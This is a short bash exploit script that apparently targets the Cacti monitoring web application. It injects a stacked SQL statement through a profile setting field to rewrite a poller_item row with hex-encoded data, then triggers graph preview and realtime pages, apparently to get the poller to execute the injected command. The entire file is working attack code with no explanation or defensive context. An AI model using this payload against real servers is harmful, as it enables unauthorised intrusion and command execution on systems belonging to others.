#!/bin/bash
PAY="1;UPDATE poller_item SET host_id=1,action=1,arg1=0x$HEX WHERE local_data_id=1;-- "
curl --data-urlencode 'name=preview_graphs_per_page' --data-urlencode "value=$PAY" "$C/auth_profile.php?tab=general&action=update_data"
curl "$C/graph_view.php?action=preview&page=1&clear=1"
curl "$C/graph_realtime.php?action=init&local_graph_id=1"
